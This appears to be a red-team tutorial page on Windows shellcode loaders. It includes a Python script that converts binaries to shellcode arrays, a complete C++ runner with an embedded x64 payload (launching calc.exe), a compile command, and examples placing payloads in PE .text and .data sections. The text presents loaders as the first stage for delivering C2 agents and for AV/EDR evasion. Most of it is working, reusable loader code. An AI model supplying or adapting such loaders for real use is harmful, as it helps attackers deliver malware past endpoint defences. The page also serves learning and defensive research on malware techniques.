# ðŸ”§ Code Execution & Payload Placement

## <mark style="color:red;">Shellcode Loaders / Wrappers</mark>

As the name suggests, a loader is a program that loads a specific payload in memory ( could be its own memory or memory of another process, A.K.A: code injection). this payload is usually a C2 agent shellcode in an encrypted / encoded format which gets decrypted / decoded before being loaded into memory. so basically a loader is just a wrapper that has the main purpose of delivering the actual malware, its also a template for implementing various AV/EDR evasion checks and techniques since its the first stage of a malware attack and will touch the disk and leave some artifacts before and after execution.&#x20;

### <mark style="color:orange;">Vanilla  C++ Shellcode Runner</mark>

here is an example of a simple python script that would convert a binary file to hex  (shellcode) format wich is then used by a shellcode loader:

{% code title="bin2shell.py" %}
```python
import sys

def read_binary_file(file_path):
    with open(file_path, 'rb') as f:
        binary_data = f.read()
    return binary_data

def print_shellcode(shellcode):
    for byte in shellcode:
        print("0x{:02X},".format(byte), end='')

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 bin_to_shellcode.py <file_path>")
        return
    
    file_path = sys.argv[1]
    shellcode = read_binary_file(file_path)
    print_shellcode(shellcode)

if __name__ == '__main__':
    main()

```
{% endcode %}

{% hint style="warning" %}
The output includes some null bytes (string terminator character) that would break the execution, these are omitted by the C++ loader code.
{% endhint %}

and here is the code for the C++ vanilla shellcode loader:

{% code title="vanilla-loader.cpp" %}
```cpp
#include <stdio.h>
#include <string.h>
#include <windows.h>

const unsigned char shellcode[] = {
0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,0x6F,0x87,0xFF,0xD5,0xBB,0xF0,0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65,0x00
};

int main() {
    // Allocate memory for shellcode in current process address space
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Failed to allocate memory.\n");
        return 1;
    }

    // Copy shellcode to allocated memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Execute the shellcode
    // 
    ((void (*)())exec_mem)();

    // Free the allocated memory
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}

```
{% endcode %}

by running the python script and placing the shellcode into the "shellcode" array we can use MSVC compiler to compile the code:



{% code title="compile.bat" %}
```c
// @ECHO OFF
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcshell-runner.cpp /link /OUT:shell-runner.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```
{% endcode %}

{% hint style="info" %}
you can use VisualStudio and create a new C++ project and simply click "build" if you dont want to use the build tools directly.
{% endhint %}

`((void (*)())exec_mem)();` casts the memory address stored in `exec_mem` as a function pointer to a function with a return type of `void` and no parameters, and then immediately calls that function.

In the context of a shellcode runner, this is used to execute the shellcode stored in the allocated memory. The memory containing the shellcode is treated as if it were a function, and by calling it as a function, the shellcode's instructions are executed.



***

## <mark style="color:red;">Shellcode Placement</mark>

PE (Portable Executable) file format has many sections and some of them can be used for storing our shellcode. the most used sections are:&#x20;



* <mark style="color:green;">**.TEXT Section :**</mark> in the context of the C shellcode runner provided earlier, where the shellcode is defined inside the `main` function, the shellcode is indeed stored in the `.text` section of the PE executable. The `.text` section is typically used to store executable code. to put your payload in .text section, simply define the shellcode array inside one of the functions defined in the program.

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// .text section is the body of any function declearation
int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// 4 byte payload
	// placed in PE .text section
	unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
	};


	unsigned int payload_len = 4;
	
	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```

* <mark style="color:green;">**.DATA Section :**</mark> if the payload is declared outside of all functions it will be saved in the data section. this section is used for global and predefined variables in the program.

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 4 byte payload
// declared outside all functions so its included in the PE .data section 
unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
};
unsigned int payload_len = 4;


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```













